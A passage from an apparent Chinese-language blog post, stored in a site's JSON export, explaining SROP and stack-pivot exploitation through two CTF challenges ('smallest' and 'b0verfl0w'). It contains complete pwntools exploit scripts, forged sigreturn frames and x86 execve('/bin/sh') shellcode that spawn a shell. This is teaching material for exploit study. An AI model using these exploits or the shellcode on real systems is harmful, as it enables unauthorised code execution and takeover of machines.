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\" alt=\"gadget1\"></p>\n<p>但是目前它已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>\n<p>值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</p>\n<p><strong>利用工具</strong></p>\n<p><strong>值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。</strong></p>\n<p><strong>360春秋杯中的smallest-pwn为例</strong></p>\n<p>1.确定文件基本信息</p>\n<p>➜ smallest file smallest<br> smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</p>\n<p>可以看到该程序为64位静态链接版本。</p>\n<p>2.检查保护</p>\n<p>➜ smallest checksec smallest<br>   Arch:   amd64-64-little<br>   RELRO:  No RELRO<br>   Stack:  No canary found<br>   NX:    NX enabled<br>   PIE:   No PIE (0x400000)</p>\n<p>程序主要开启了NX保护。</p>\n<p>3.漏洞发现</p>\n<p>实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public start</span><br><span class=\"line\">start proc near</span><br><span class=\"line\">xor     rax, rax</span><br><span class=\"line\">mov     edx, 400h</span><br><span class=\"line\">mov     rsi, rsp</span><br><span class=\"line\">mov     rdi, rax</span><br><span class=\"line\">syscall</span><br><span class=\"line\">retn</span><br><span class=\"line\">start endp</span><br></pre></td></tr></table></figure>\n\n<p>根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。</p>\n<p>4.利用思路</p>\n<p>由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下</p>\n<ul>\n<li>通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn</li>\n<li>通过syscall执行execve(“/bin/sh”,0,0)来获取shell。</li>\n</ul>\n<p>5.漏洞利用程序</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">7777</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    sh = process(<span class=\"string\">&#x27;./smallest&#x27;</span>)</span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x00000000004000BE</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x00000000004000B0</span></span><br><span class=\"line\"><span class=\"comment\">## set start addr three times</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">3</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"><span class=\"comment\">## modify the return addr to start_addr+3</span></span><br><span class=\"line\"><span class=\"comment\">## so that skip the xor rax,rax; then the rax=1</span></span><br><span class=\"line\"><span class=\"comment\">## get stack addr</span></span><br><span class=\"line\">sh.send(<span class=\"string\">&#x27;\\xb3&#x27;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">8</span>:<span class=\"number\">16</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"><span class=\"comment\">## make the rsp point to stack_addr</span></span><br><span class=\"line\"><span class=\"comment\">## the frame is read(0,stack_addr,0x400)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\"><span class=\"comment\">## set rax=15 and call sigreturn</span></span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"><span class=\"comment\">## call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = stack_addr + <span class=\"number\">0x120</span>  <span class=\"comment\"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">frame_payload = p64(start_addr) + <span class=\"string\">&#x27;b&#x27;</span> * <span class=\"number\">8</span> + <span class=\"built_in\">str</span>(sigframe)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"built_in\">len</span>(frame_payload)</span><br><span class=\"line\">payload = frame_payload + (<span class=\"number\">0x120</span> - <span class=\"built_in\">len</span>(frame_payload)) * <span class=\"string\">&#x27;\\x00&#x27;</span> + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>其基本流程为</p>\n<ul>\n<li>读取三个程序起始地址</li>\n<li>程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1</li>\n<li>那么此时将会执行write(1,$esp,0x400)，泄露栈地址。</li>\n<li>利用第三个程序起始地址进而读入payload</li>\n<li>再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve(‘/bin/sh’,0,0)</li>\n<li>再次读取构造sigreturn调用，从而获取shell。</li>\n</ul>\n<p><strong>花式栈溢出技巧</strong></p>\n<p><strong>stack privot</strong></p>\n<p>stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot</p>\n<ul>\n<li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li>\n<li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>\n<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞</li>\n</ul>\n<p>此外，利用stack privot有以下几个要求</p>\n<ul>\n<li><p>可以控制程序执行流。</p>\n</li>\n<li><p>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是</p>\n<p><strong>pop rsp/esp</strong></p>\n</li>\n</ul>\n<p>当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/7i 0x000000000040061a</span><br><span class=\"line\">0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx</span><br><span class=\"line\">0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp</span><br><span class=\"line\">0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12</span><br><span class=\"line\">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class=\"line\">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class=\"line\">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class=\"line\">0x400624 &lt;__libc_csu_init+100&gt;: ret    </span><br><span class=\"line\">gef➤  x/7i 0x000000000040061d</span><br><span class=\"line\">0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp</span><br><span class=\"line\">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class=\"line\">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class=\"line\">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class=\"line\">0x400624 &lt;__libc_csu_init+100&gt;: ret</span><br></pre></td></tr></table></figure>\n\n<p>此外，还有更加高级的fake frame。</p>\n<ul>\n<li>存在可以控制内容的内存，一般有如下</li>\n<li>bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。</li>\n<li>heap。但是这个需要我们能够泄露堆地址。</li>\n</ul>\n<p>以<strong>X-CTF Quals 2016 - b0verfl0w</strong>为例</p>\n<p>1.首先，查看程序的安全保护，如下：</p>\n<p>➜ X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w<br>   Arch:   i386-32-little<br>   RELRO:  Partial RELRO<br>   Stack:  No canary found<br>   NX:    NX disabled<br>   PIE:   No PIE (0x8048000)<br>   RWX:   Has RWX segments</p>\n<p>2.可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> <span class=\"title\">vul</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+18h] [bp-20h]@1</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\n======================&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\n======================&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  fgets(&amp;s, <span class=\"number\">50</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello %s.&quot;</span>, &amp;s);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下：</p>\n<p>- 利用栈溢出布置shellcode<br> - 控制eip指向shellcode处</p>\n<p>4.第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only &#x27;jmp|ret&#x27;         </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08048504 : jmp esp</span><br><span class=\"line\">0x0804836a : ret</span><br><span class=\"line\">0x0804847e : ret 0xeac1</span><br><span class=\"line\">Unique gadgets found: 3</span><br></pre></td></tr></table></figure>\n\n<p>5.这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp</span><br></pre></td></tr></table></figure>\n\n<p>那么我们payload中的最后一部分改如何设置esp呢，可以知道：</p>\n<ul>\n<li>size(shellcode+padding)=0x20</li>\n<li>size(fake ebp)=0x4</li>\n<li>size(0x08048504)=0x4</li>\n</ul>\n<p>所以我们最后一段需要执行的指令就是：</p>\n<p>sub 0x28,esp<br>jmp esp</p>\n<p>所以最后的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class=\"line\">shellcode_x86 = <span class=\"string\">&quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">&quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">&quot;\\x0b\\xcd\\x80&quot;</span></span><br><span class=\"line\">sub_esp_jmp = asm(<span class=\"string\">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class=\"line\">jmp_esp = <span class=\"number\">0x08048504</span></span><br><span class=\"line\">payload = shellcode_x86 + (</span><br><span class=\"line\">    <span class=\"number\">0x20</span> - <span class=\"built_in\">len</span>(shellcode_x86)) * <span class=\"string\">&#x27;b&#x27;</span> + <span class=\"string\">&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"完了，应该？？-≧-﹏-≦！！！\"><a href=\"#完了，应该？？-≧-﹏-≦！！！\" class=\"headerlink\" title=\"完了，应该？？ ≧ ﹏ ≦！！！\"></a>完了，应该？？ ≧ ﹏ ≦！！！</h3>"}],"PostAsset":[],"PostCategory":[],"PostTag":[],"Tag":[]}}